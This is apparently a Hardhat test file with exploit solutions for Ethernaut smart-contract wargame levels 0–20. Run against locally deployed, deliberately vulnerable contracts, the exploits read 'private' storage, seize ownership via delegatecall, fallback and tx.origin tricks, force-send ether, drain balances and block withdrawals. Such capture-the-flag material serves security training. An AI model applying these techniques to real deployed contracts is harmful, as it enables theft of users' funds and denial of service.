const chai = require("chai");
const { assert, expect } = chai;
var chaiAsPromised = require("chai-as-promised");
chai.use(chaiAsPromised);
const { getContractAddress } = require("@ethersproject/address");

describe("Ethernaut", function () {
	let owner, user, hacker = null;
	const invalid           = "0x0000000000000000000000000000000000000000";
	const amount            = ethers.parseEther("0.00001");

	before(async () => {
        [owner, user, hacker] = await ethers.getSigners();
    });

	describe("Level 0 - Instance", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Instance", [ethers.encodeBytes32String("ethernaut8")]); // initial password
			const passwordCurrent = await contract.password(); // password is public and as such can be stolen
			await contract.authenticate(passwordCurrent);
			const clearedCurrent = await contract.getCleared();
			assert.isTrue(clearedCurrent, "Failed to pass level 0."); // clear to pass the level
		});
	});

	describe("Level 1 - Fallback", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Fallback");
			await contract.connect(hacker).contribute({ value: amount }); // send amount less than 0.001 ether to bypass "require" in the next call
			await hacker.sendTransaction({ from: hacker, to: contract, value: amount }); // trigger the receive() function to set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 1.");
			await contract.connect(hacker).withdraw(); // withdraw the whole balance to pass the level
		});
	});

	describe("Level 2 - Fallout", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Fallout");
			await contract.connect(hacker).Fal1out({ value: amount }); // typo in the constructor function makes it a normal function | setting the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 2.");
			await contract.connect(hacker).collectAllocations(); // withdraw the whole balance to pass the level
		});
	});

	describe("Level 3 - CoinFlip", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("CoinFlip");
			const exploit = await ethers.deployContract("CoinFlipExploit");
			for (let i = 0; i < 10; i++) {
				await exploit.run(contract); // reverse engineer the algorithm to always win
			}
			const count = await contract.consecutiveWins();
			expect(count).to.equal(10, "Failed to pass level 3."); // get 10 wins in a row to pass the level
		});
	});

	describe("Level 4 - Telephone", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Telephone");
			const exploit = await ethers.deployContract("TelephoneExploit");
			await exploit.run(contract, hacker); // use a proxy contract to bypass "tx.origin" check | this will set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 4."); // become the owner to pass the level
		});
	});

	describe("Level 5 - Token", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Token", [amount], { from: owner });
			await expect(contract.connect(owner).transfer(user, amount + BigInt("1"))).to.be.reverted; // cause an integer underflow to pass the level | solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
		});
	});

	describe("Level 6 - Delegate", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Delegate", [owner]);
			await hacker.sendTransaction({ from: hacker, to: contract, data: ethers.keccak256(ethers.toUtf8Bytes("pwn()")) }) // trigger the fallback() function to set the hacker as the new owner
			const ownerCurrent = await contract.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 6."); // become the owner to pass the level
		});
	});

	describe("Level 7 - Force", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Force");
			const exploit = await ethers.deployContract("ForceExploit");
			const balanceOld = await ethers.provider.getBalance(contract);
			await hacker.sendTransaction({ from: hacker, to: exploit, value: amount }); // send some balance to the exploit contract using the receive() function
			await exploit.run(contract); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function			
			const balanceNew = await ethers.provider.getBalance(contract);
			assert(balanceNew > balanceOld, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
		});
	});

	describe("Level 8 - Vault", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Vault", [ethers.encodeBytes32String("ethernaut8")]); // the password is stored in the contract storage which is public
			const passwordCurrent = await ethers.provider.getStorage(contract, 1); // retrieve the password from the contract storage
			await contract.unlock(passwordCurrent);
			const lockedCurrent = await contract.locked();
			assert(!lockedCurrent, "Failed to pass level 8."); // unlock to pass the level
		});
	});

	describe("Level 9 - King", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("King", { from: owner, value: amount });
			const exploit = await ethers.deployContract("KingExploit");
			await exploit.run(contract, { value: amount + BigInt("1") }); // set the new king and DoS the game | omit receive() and fallback() functions in the exploit contract to crash the game
			// any new transaction (attempt to become a new king) will now revert because the previous king (exploit contract) does not have the receive() and fallback() functions
			await expect(hacker.sendTransaction({ from: hacker, to: contract, value: amount + BigInt("2") })).to.be.reverted; // DoS the game to pass the level
		});
	});

	describe("Level 10 - Reentrance", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Reentrance");
			const exploit = await ethers.deployContract("ReentranceExploit");
			await contract.donate(user, { value: amount * BigInt("3") }); // put in some balance from other users
			// const balanceOld = await ethers.provider.getBalance(contract);
			// await exploit.run(contract, { value: amount, gas: 4465030 }); // create the integer underflow using reentrancy
			// const balanceNew = await ethers.provider.getBalance(contract);
			// assert(balanceNew < balanceOld, "Failed to pass level 10."); // withdraw the whole balance to pass the level
			await expect(exploit.run(contract, { value: amount, gas: 4465030 })).to.be.reverted; // solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
		});
	});

	describe("Level 11 - Elevator", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Elevator");
			const exploit = await ethers.deployContract("ElevatorExploit");
			await exploit.run(contract, 10);
			const topCurrent = await contract.top();
			assert(topCurrent, "Failed to pass level 11."); // get to the top floor to pass the level
		});
	});

	describe("Level 12 - Privacy", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Privacy", [[ // bytes32 array is stored in the contract storage which is public
			ethers.encodeBytes32String("ether"), // 32 bytes = 64 length / 2 hex chars
			ethers.encodeBytes32String("naut"),
			ethers.encodeBytes32String("12") // this is the key we need
		]]);
		// contract storage consists of multiple 32-byte slots where smaller values are grouped together to fit into one slot
		const key = await ethers.provider.getStorage(contract, 5); // retrieve the key from the contract storage
		await contract.unlock(key.slice(0, 34)); // convert / trim the key to bytes16 value
		const lockedCurrent = await contract.locked();
		assert(!lockedCurrent, "Failed to pass level 12."); // unlock to pass the level
		});
	});

	describe("Level 13 - Gatekeeper", async () => {
		// works with truffle, need to figure out why it does not work with hardhat
		xit("Exploit", async () => {
			const contract = await ethers.deployContract("Gatekeeper");
			const exploit = await ethers.deployContract("GatekeeperExploit", { from: hacker, signer: hacker }); // use a proxy contract to bypass gateOne() and gateThree() modifiers
			for (let i = 15625; i < 15630; i++) {
				// brute-force the gas to bypass gateTwo() modifier | trial and error | the scope was adjusted to speed up the test
				try {
					await exploit.connect(hacker).run(contract.target, { from: hacker, gas: 800000 + i });
					// console.log(i); // required gas is 800000 + 15628 = 815628
					break;
				} catch (err) {}
			}
			const entrantCurrent = await contract.entrant();
			expect(entrantCurrent).to.equal(hacker, "Failed to pass level 13."); // become the entrant to pass the level
		});
	});


	describe("Level 14 - GatekeeperTwo", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("GatekeeperTwo");
			await contract.waitForDeployment();
			const exploit = await ethers.deployContract("GatekeeperTwoExploit", [contract], { from: hacker, signer: hacker });
			const entrantCurrent = await contract.entrant();
			expect(entrantCurrent).to.equal(hacker, "Failed to pass level 14."); // become the entrant to pass the level
		});
	});

	describe("Level 15 - NaughtCoin", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("NaughtCoin", [owner]);
			const balanceCurrent = await contract.balanceOf(owner);
			await contract.approve(hacker, balanceCurrent); // call publicly available and unprotected ERC20 functions approve() and transferFrom() to exploit the contract
			await contract.connect(hacker).transferFrom(owner, hacker, balanceCurrent);
			const balanceNew = await contract.balanceOf(owner);
			expect(balanceNew).to.equal(0, "Failed to pass level 15."); // withdraw the whole balance to pass the level
		});
	});

	describe("Level 16 - NaughtCoin", async () => {
		it("Exploit", async () => {
			const library = await ethers.deployContract("LibraryContract");
			const contract = await ethers.deployContract("Preservation", [library, library]);
			const exploit = await ethers.deployContract("PreservationExploit");
			await contract.setFirstTime(exploit.target); // delegatecall() to "LibraryContract" will overwrite "timeZone1Library" address due to incorrectly defined contract storage
			await contract.connect(hacker).setFirstTime((new Date()).getTime());
			const ownerCurrent = await contract.owner();
			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 16."); // become the owner to pass the level
		});
	});

	describe("Level 17 - Recovery", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Recovery");
			const exploit = await ethers.deployContract("RecoveryExploit");
			await contract.connect(owner).generateToken("ethernaut", 5000); // create a new token contract and give the owner some of the tokens
			const targetAddress = getContractAddress({ from: contract.target, nonce: 1 }); // calculate "SimpleToken" address, nonce is the number of transactions sent from the sender's address
			await user.sendTransaction({ from: user, to: targetAddress, value: amount }); // deposit some real ETH in exchange for tokens
			const balanceHackerOld = await ethers.provider.getBalance(hacker);
			await exploit.run(targetAddress, hacker);
			const balanceHackerNew = await ethers.provider.getBalance(hacker);
			assert(balanceHackerNew > balanceHackerOld, "Failed to pass level 17."); // withdraw the whole balance to pass the level
		});
	});

	describe("Level 18 - MagicNumber", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("MagicNumber");
			const exploit = await ethers.deployContract("MagicNumberExploit");
			await exploit.run(contract);
			const validateCurrent = await contract.validate();
			assert(validateCurrent, "Failed to pass level 18.");
			// another example without exploit contract
			// const bytecode = "0x600A600C600039600A6000F3602A60005260206000F3";
			// const txn = await hacker.sendTransaction({ from: hacker, data: bytecode }); // to create a smart contract, send a transaction without the recipient
			// const receipt = await ethers.provider.getTransactionReceipt(txn.hash);
			// await contract.setSolver(receipt.contractAddress);
			// const validateCurrent = await contract.validate();
			// assert(validateCurrent, "Failed to pass level 18.");
		});
	});

	describe("Level 19 - AlienCodex", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("AlienCodex");
			const exploit = await ethers.deployContract("AlienCodexExploit");
			// await exploit.connect(hacker).run(contract);
			// const ownerCurrent = await contract.owner();
			// expect(ownerCurrent).to.equal(hacker, "Failed to pass level 19.");
			await expect(exploit.connect(hacker).run(contract)).to.be.reverted; // solidity v0.8.0+ is immune to array length underflows and overflows and will revert any such transaction
		});
	});

	describe("Level 20 - Denial", async () => {
		it("Exploit", async () => {
			const contract = await ethers.deployContract("Denial");
			const exploit = await ethers.deployContract("DenialExploit");
			await owner.sendTransaction({ from: owner, to: contract, value: amount }); // deposit some ETH to the target's contract
			await contract.setWithdrawPartner(exploit); // set the hacker's contract as the partner, hacker's contract will always revert on target's contract withdrawal
			await expect(contract.withdraw({ gasLimit: 91000 })).to.be.rejectedWith("out of gas"); // DoS the withdrawal to pass the level | balance must stay unchanged to pass the level
		});
	});
});
